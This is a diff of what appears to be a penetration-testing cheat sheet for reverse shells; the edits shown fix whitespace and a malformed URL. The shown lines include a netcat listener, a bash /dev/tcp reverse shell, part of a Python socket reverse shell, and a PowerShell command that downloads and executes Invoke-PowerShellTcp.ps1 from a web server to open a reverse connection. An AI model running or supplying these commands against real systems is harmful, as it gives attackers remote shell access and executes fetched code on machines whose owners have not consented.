@@ -34,7 +34,7 @@ TODO
 ```
 nc -lvnp <PORT>
 ```
-2. Execute reverse shell command
+2. Execute reverse shell command  
 **Bash**
 ```bash
 bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
@@ -56,7 +56,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```
 **Powershell**
 ```powershell
-powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http:///<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>
 ```
 **PHP**
 ```php
